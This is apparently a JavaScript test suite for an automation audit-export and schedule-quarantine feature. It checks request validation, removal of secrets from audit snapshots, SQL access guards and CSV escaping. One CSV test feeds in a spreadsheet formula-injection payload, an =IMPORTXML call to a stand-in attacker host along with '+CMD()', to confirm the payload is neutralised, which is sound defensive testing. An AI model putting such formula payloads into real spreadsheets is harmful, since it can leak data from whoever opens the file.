import test from "node:test";
import assert from "node:assert/strict";
import {readFile} from "node:fs/promises";
import {parseAutomationControlRequest} from "../supabase/functions/_shared/automation-control-contract.mjs";
import {automationAuditCsv,checkedAutomationAuditSnapshot}
  from "../src/lib/automationAuditExport.mjs";
const read=path=>readFile(new URL("../"+path,import.meta.url),"utf8");
const id="11111111-1111-4111-8111-111111111111";
const schedule="22222222-2222-4222-8222-222222222222";
const reqId="33333333-3333-4333-8333-333333333333";
const baseRow={
  id:"44444444-4444-4444-8444-444444444444",
  workflow_id:id,workflow_revision:1,trigger_type:"manual",
  created_at:"2026-11-22T20:30:00Z",input_lines:1,output_lines:1,
  input_characters:4,output_characters:4,
  trace:[{id:"s1",kind:"trim",changed:false}],
};
const baseSnapshot={
  schema:"eternyx-automation-audit-v1",
  source:"database_completed_runs",generatedAt:"2026-11-22T20:30:00Z",
  rangeDays:7,workflowId:id,channel:"manual",
  totalMatching:1,included:1,truncated:false,
  rawInputsIncluded:false,rawOutputsIncluded:false,
  rows:[baseRow],
};
test("strict audit action contracts reject foreign URLs and arbitrary commands",()=>{
  const accepted=[
    {action:"observability"},
    {action:"exportAudit",requestKey:reqId},
    {action:"exportAudit",requestKey:reqId,workflowId:id,channel:"scheduled"},
    {action:"quarantineSchedule",scheduleId:schedule,
      expectedRevision:2,reason:"stale_lease",requestKey:reqId},
    {action:"quarantineSchedule",scheduleId:schedule,
      expectedRevision:2,reason:"unexpected_behavior",requestKey:reqId},
    {action:"quarantineSchedule",scheduleId:schedule,
      expectedRevision:2,reason:"manual_safety_hold",requestKey:reqId},
  ];
  for(const request of accepted){
    assert.equal(parseAutomationControlRequest(request).ok,true,JSON.stringify(request));
  }
  const denied=[
    {action:"observability",owner:id},
    {action:"exportAudit",requestKey:reqId,workflowId:"invalid"},
    {action:"exportAudit",requestKey:reqId,channel:"all"},
    {action:"exportAudit",requestKey:"not-a-uuid"},
    {action:"exportAudit",requestKey:reqId,url:"https://example.com"},
    {action:"exportAudit",requestKey:reqId,includeRaw:true},
    {action:"quarantineSchedule",scheduleId:schedule,expectedRevision:0,
      reason:"stale_lease",requestKey:reqId},
    {action:"quarantineSchedule",scheduleId:schedule,expectedRevision:2147483648,
      reason:"stale_lease",requestKey:reqId},
    {action:"quarantineSchedule",scheduleId:schedule,expectedRevision:1,
      reason:"rerun_failed_job",requestKey:reqId},
    {action:"quarantineSchedule",scheduleId:schedule,expectedRevision:1,
      reason:"stale_lease",requestKey:"invalid"},
    {action:"quarantineSchedule",scheduleId:schedule,expectedRevision:1,
      reason:"stale_lease",requestKey:reqId,runNow:true},
  ];
  for(const request of denied){
    assert.equal(parseAutomationControlRequest(request).ok,false,JSON.stringify(request));
  }
});
test("audit snapshots sanitize previously stored nonsecret run metadata",()=>{
  const candidate={...baseSnapshot,rows:[{
    ...baseRow,password:"private-password",input:"confidential text",
    output:"private output",request_fingerprint:"beef",access_token:"secret",
  }]};
  const checked=checkedAutomationAuditSnapshot(candidate);
  const serialized=JSON.stringify(checked);
  assert.equal(checked.included,1);
  assert.equal(checked.rows[0].stepCount,1);
  for(const term of ["private-password","confidential text","private output",
    "request_fingerprint","access_token","\"trace\""]){
    assert.equal(serialized.includes(term),false,term);
  }
  assert.equal(checked.totalMatching,1);
});
test("JSON checks reject fabricated records, fake completeness and oversized exports",()=>{
  for(const raw of [
    {...baseSnapshot,source:"client_demo"},
    {...baseSnapshot,rawOutputsIncluded:true},
    {...baseSnapshot,totalMatching:101,included:1,truncated:false},
    {...baseSnapshot,totalMatching:0,included:1},
    {...baseSnapshot,rows:Array(101).fill(baseRow),included:101,totalMatching:101,truncated:true},
    {...baseSnapshot,rows:[{...baseRow,trigger_type:"external"}]},
    {...baseSnapshot,rows:[{...baseRow,output_lines:-1}]},
    {...baseSnapshot,rows:[{...baseRow,created_at:"invalid"}]},
    {...baseSnapshot,rows:[{...baseRow,trace:Array(13).fill({id:"a"})}]},
  ]){
    assert.throws(()=>checkedAutomationAuditSnapshot(raw));
  }
});
test("CSV prevents spreadsheet formula injection and doubles embedded quotes",()=>{
  const dangerous={...baseSnapshot,rows:[{
    ...baseRow,id:'=IMPORTXML("https://evil.example","x")',
    workflow_id:"+CMD()",
  }]};
  const csv=automationAuditCsv(dangerous);
  assert.ok(csv.startsWith("\ufeff"));
  assert.ok(csv.includes(String.fromCharCode(34,39,61)+"IMPORTXML("));
  assert.ok(csv.includes('""https://evil.example""'));
  assert.ok(csv.includes(String.fromCharCode(34,39,43)+"CMD()"));
  assert.equal(csv.includes("private-password"),false);
  assert.match(csv,/stepCount/);
});
test("actual SQL is service-only, quota guarded and never auto-retries",async()=>{
  const sql=await read("supabase/migrations/20261123080000_automation_observability_recovery.sql");
  const endpoint=await read("supabase/functions/automation-control/index.ts");
  const panel=await read("src/components/AutomationAuditRecoveryPanel.tsx");
  const cloud=await read("src/components/AutomationCloudPanel.tsx");
  for(const symbol of ["automation_observability_snapshot",
    "automation_prepare_audit_export","automation_quarantine_schedule",
    "automation_prune_audit_recovery"]){
    assert.ok(sql.includes(symbol),symbol);
    assert.ok(endpoint.includes(symbol),symbol);
  }
  assert.match(sql,/CREATE TABLE public\.automation_audit_exports/);
  assert.match(sql,/CREATE TABLE public\.automation_schedule_quarantines/);
  assert.match(sql,/LIMIT 100/);
  assert.match(sql,/daily_export_limit/);
  assert.match(sql,/daily_quarantine_limit/);
  assert.match(sql,/lease_expires_at>[\s\S]{0,80}statement_timestamp/);
  assert.match(sql,/enabled=false,revision=revision\+1/);
  assert.match(sql,/run_request_key=gen_random_uuid\(\)/);
  assert.match(sql,/pg_advisory_xact_lock/);
  assert.match(sql,/REVOKE ALL ON public\.automation_audit_exports FROM PUBLIC,anon,authenticated/);
  assert.match(sql,/REVOKE ALL ON public\.automation_schedule_quarantines FROM PUBLIC,anon,authenticated/);
  assert.doesNotMatch(sql,/SECURITY DEFINER/);
  assert.match(endpoint,/authenticateUser\(req\)/);
  assert.match(endpoint,/p_user_id:user\.id/);
  assert.match(endpoint,/automaticRetryQueued:false/);
  assert.match(endpoint,/externalActionTriggered:false/);
  assert.match(endpoint,/leaseActive:/);
  assert.match(panel,/Prepare verified audit snapshot/);
  assert.match(panel,/Quarantine schedule; do not retry/);
  assert.match(panel,/realDeliveryVerified!==false/);
  assert.match(panel,/window\.confirm/);
  assert.match(cloud,/<AutomationAuditRecoveryPanel/);
});
